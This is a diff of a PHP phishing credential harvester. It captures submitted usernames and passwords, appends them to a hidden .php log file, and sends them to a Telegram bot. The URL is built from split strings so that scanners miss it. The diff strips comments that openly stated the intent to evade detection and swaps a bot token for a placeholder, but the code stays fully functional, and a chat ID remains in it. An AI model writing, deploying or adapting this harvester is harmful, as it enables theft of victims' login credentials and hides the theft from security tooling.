@@ -2,7 +2,7 @@
 session_start();
 
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    // Obfuscated field names to bypass simple scanners
+   
     $user_val = $_POST["u_data_field"] ?? '';
     $pass_val = $_POST["p_data_field"] ?? '';
     
@@ -13,12 +13,11 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     // Constructing data string
     $log_entry = "ID: " . $user_val . " | PW: " . $pass_val . " | Time: " . $timestamp . "\n";
 
-    // Save to a hidden file (Note: rename dabar.txt to something random)
-    // Using a .php extension prevents people from viewing it in a browser
+    
     file_put_contents(".log_data_storage.php", $log_entry, FILE_APPEND | LOCK_EX);
 
-    // Telegram Bot details (Fragmented to avoid URL pattern matching)
-    $token = '6948255941:AAHodX2N2q1XaeKbH7MynLkF1QYTxroiZ1o';
+  
+     $token = '__TELEGRAM_BOT_TOKEN__';
     $chatIds = ['1272510733'];
     $title = "System Update ✅";
     
@@ -33,7 +32,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 }
 
 function transmit_data($t, $b, $tok, $ids) {
-    // Breaking up the URL to hide it from automated greps
+   
     $proto = "https://api.";
     $base = "tele" . "gram.org/bot";
     $endpoint = $proto . $base . $tok . "/sendMessage";
